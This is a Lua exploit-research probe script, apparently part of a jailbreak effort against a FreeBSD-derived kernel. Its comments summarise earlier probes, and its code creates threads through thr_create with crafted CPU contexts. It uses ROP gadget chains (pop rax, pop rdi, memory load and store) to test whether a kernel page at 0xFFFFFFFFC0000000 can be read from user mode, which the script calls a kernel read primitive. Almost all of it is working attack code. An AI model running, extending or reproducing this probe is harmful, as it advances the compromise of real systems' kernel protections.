-- CRASH_CLASS: MODERATE
-- PROBE 1459a: is the kernel page at 0xFFFFFFFFC0000000 readable from CPL3, and what does a
--              faulting chained child do to the process?
--
-- Context:
--   1331a spawned 512 thr_create(430) children with RIP = a kernel address; every one faulted on the
--   instruction FETCH, the loader's handler dumped a short context record each time, and the process
--   survived all 512 (`[E] spawned=512 failed=0 alive pid=80`).  That is the presence oracle.
--
--   It measured EXECUTE permission only.  Bit 2 of the #PF error word means "the access came from
--   CPL3", not "the PTE has U set", so a page that is user-accessible but NX reports the same error
--   word 5 as a supervisor page.  The readable subset of the kernel half has never been measured.
--
--   1457a and 1458a both ran a chained child FIRST (RIP = "mov rax,[rax]; ret", RAX = a user page,
--   RDI = a marker, RSP -> [store][exit]) and the control always stored 0x41424344.  In both runs
--   the SECOND spawn ended the process -- in 1458a even a plain 1331a-style fetch fault with no
--   chain.  So the poison is caused by whatever the chained child leaves behind, not by the fault.
--
--   This probe puts the kernel data load FIRST, as the very first chained child in a fresh process,
--   so its outcome is not confounded by anything earlier:
--       marker changes  -> the kernel page IS user-readable, which is a kernel read primitive
--       marker sentinel -> the load faulted; the process either survived (child died alone) or not
--   [2] then repeats 1331a's plain fetch fault to see whether the poison state is reached at all,
--   and [3] runs the user-page control chain to see whether chains still work afterwards.
--
-- -- prior art:
--   .local/1331a.lua + results/1331a_20261109_094441.txt (512 contained FETCH faults, process alive)
--   probes/phase36_realargs/1457a_kernel_readable_thrcreate.lua + results/..._174702.txt
--   probes/phase36_realargs/1458a_first_insn_data_fault.lua + results/..._174839.txt
--     (control 0x41424344 both times; the next spawn after a chained child ended the process)
--   probes/phase17_new_vectors/156d_thr_create_child_executes.lua:76-77 (ucontext GPR offsets)
--   .local/loader_payload/signal.lua (handler installs for SIGILL/SIGBUS/SIGSEGV only)

print("=== PROBE 1459a: KERNEL DATA READABILITY (FIRST CHAINED CHILD) ===")
print("")

local function to_num(v) if type(v)=="table" and v.tonumber then return v:tonumber() end if type(v)=="table" and v.h then return v.h*4294967296+v.l end return tonumber(v) or 0 end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function as_addr(t) local s=tostring(t) local m=s:match("0x(%x+)") if m then return tonumber(m,16) end return to_num(t) end
local function wq(a,v) pcall(function() memory.write_qword(uint64(a),uint64(v)) end) end
local function rq(a) local ok,v=pcall(function() return memory.read_qword(uint64(a)) end) if ok then return v end return nil end
local function hi_lo(v) if type(v)=="table" and v.h then return v.h,v.l end return 0,to_num(v) end
local function fmt(v) if v==nil then return "nil" end local h,l=hi_lo(v) return string.format("0x%08X%08X",h,l) end

local pid0 = to_num(mk(20)())
print(string.format("[0] pid=%d", pid0))

local g_pop_rax = gadgets["pop rax; ret"]
local g_pop_rdi = gadgets["pop rdi; ret"]
local g_load    = gadgets["mov rax, [rax]; ret"]
local g_store   = gadgets["mov [rdi], rax; ret"]
local stub = syscall.pipe.fn_addr
print(string.format("[0] load=%s store=%s", fmt(g_load), fmt(g_store)))
if not (g_pop_rax and g_pop_rdi and g_load and g_store) then
    print("[!] gadget missing"); print("=== PROBE 1459a COMPLETE ==="); return
end

local function mmap(px)
    local ok,a = pcall(function() return mk(477)(uint64(0),uint64(px),uint64(3),uint64(0x1002),uint64(0xFFFFFFFF),uint64(0)) end)
    local v = ok and to_num(a) or 0
    if v ~= 0 and v < 0x8000000000 then for o=0,px-8,8 do wq(v+o,0) end end
    return v
end

local MARK = as_addr(memory.alloc(0x20))
local SENT = 0xCAFEBABE
local blk = mmap(0x10000)
if blk <= 0 then print("[!] mmap failed"); print("=== PROBE 1459a COMPLETE ==="); return end
local ss = 0x10000
local STOP = blk + ss - 0x400
local FSTK = blk + ss - 0x800
print(string.format("[0] blk=0x%X chain_rsp=0x%X fetch_rsp=0x%X mark=0x%X", blk, STOP, FSTK, MARK))

local Ctx = {RDI=0x048, RAX=0x078, MAGIC=0x108, TYPE=0x110, CS=0x0C0, RIP=0x0E0, RSP=0x0F8, SS=0x100}
local ctxa = as_addr(memory.alloc(0x500))
local tb = as_addr(memory.alloc(8))
local tsa = as_addr(memory.alloc(16))

local function sleep_ms(ms)
    wq(tsa, 0); wq(tsa + 8, ms * 1000000)
    pcall(function() mk(240)(uint64(tsa), uint64(0)) end)
end

local function spawn_fetch(target)
    for o = 0, 0x4F8, 8 do wq(ctxa + o, 0) end
    wq(ctxa + Ctx.MAGIC, 0x480); wq(ctxa + Ctx.TYPE, 0x10000)
    wq(ctxa + Ctx.CS, 0x43); wq(ctxa + Ctx.SS, 0x3B)
    wq(ctxa + Ctx.RIP, target); wq(ctxa + Ctx.RSP, FSTK)
    wq(tb, 0)
    local ok, rv = pcall(function() return mk(430)(uint64(ctxa), uint64(tb), uint64(0)) end)
    return ok and to_num(rv) or -999
end

local function spawn_chain(target, mark)
    wq(STOP +  0, g_store)
    wq(STOP +  8, g_pop_rdi)
    wq(STOP + 16, 0)
    wq(STOP + 24, g_pop_rax)
    wq(STOP + 32, 431)
    wq(STOP + 40, stub)
    for o = 0, 0x4F8, 8 do wq(ctxa + o, 0) end
    wq(ctxa + Ctx.MAGIC, 0x480); wq(ctxa + Ctx.TYPE, 0x10000)
    wq(ctxa + Ctx.CS, 0x43); wq(ctxa + Ctx.SS, 0x3B)
    wq(ctxa + Ctx.RIP, g_load); wq(ctxa + Ctx.RSP, STOP)
    wq(ctxa + Ctx.RAX, target); wq(ctxa + Ctx.RDI, mark)
    wq(tb, 0)
    local ok, rv = pcall(function() return mk(430)(uint64(ctxa), uint64(tb), uint64(0)) end)
    return ok and to_num(rv) or -999
end

local function mark_line(tag, rv)
    local raw = rq(MARK)
    print(string.format("[%s] thr_create=%d marker=%s %s", tag, rv, fmt(raw),
        (to_num(raw) == SENT) and "(sentinel: the load faulted)" or "(CHANGED: the load succeeded)"))
end

-- [1] THE QUESTION, as the first chained child in this process
print("[1] chained child: data load from 0xFFFFFFFFC0000000")
wq(MARK, uint64(SENT))
mark_line("1", spawn_chain(0xFFFFFFFFC0000000, MARK))
sleep_ms(100)
print(string.format("[1] alive pid=%d", to_num(mk(20)())))
print("")

-- [2] does a plain fetch fault still behave like 1331a here?
print("[2] plain fetch fault at 0xFFFFFFFFC1000000 (1331a shape)")
local rv2 = spawn_fetch(0xFFFFFFFFC1000000)
sleep_ms(80)
print(string.format("[2] thr_create=%d alive pid=%d", rv2, to_num(mk(20)())))
print("")

-- [3] do chains still work here?
print("[3] chained child: data load from a user page (control)")
local CTRL = as_addr(memory.alloc(0x20))
wq(CTRL, uint64(0x41424344))
wq(MARK, uint64(SENT))
mark_line("3", spawn_chain(CTRL, MARK))
sleep_ms(80)
print(string.format("[3] alive pid=%d", to_num(mk(20)())))
print("")

print(string.format("[D] final pid=%d (was %d)", to_num(mk(20)()), pid0))
print("")
print("=== PROBE 1459a COMPLETE ===")
